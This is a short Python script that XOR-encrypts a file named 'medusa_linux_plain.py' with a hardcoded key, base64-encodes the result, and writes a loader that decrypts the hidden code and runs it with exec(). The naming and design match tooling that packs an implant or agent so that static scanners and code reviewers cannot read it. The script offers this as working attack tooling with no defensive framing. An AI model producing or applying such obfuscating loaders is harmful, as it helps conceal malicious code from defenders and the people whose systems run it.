import base64
import itertools

key = b'4626a58f29e3499d19c3a7531a8a0ab2'

input_filename = "medusa_linux_plain.py"

output_filename = "medusa_linux.py"

with open(input_filename, "r", encoding="utf-8") as f:
    plaintext = f.read()

xored_bytes = bytes([ord(c) ^ k for c, k in zip(plaintext, itertools.cycle(key))])

encoded_data = base64.b64encode(xored_bytes).decode("utf-8")

loader_code = f"""import base64, itertools
exec(''.join(chr(c^k) for c,k in zip(base64.b64decode(b'{encoded_data}'), itertools.cycle(b'{key.decode()}'))))
"""

with open(output_filename, "w", encoding="utf-8") as f:
    f.write(loader_code)

print(f"Encrypted data saved to {output_filename}")
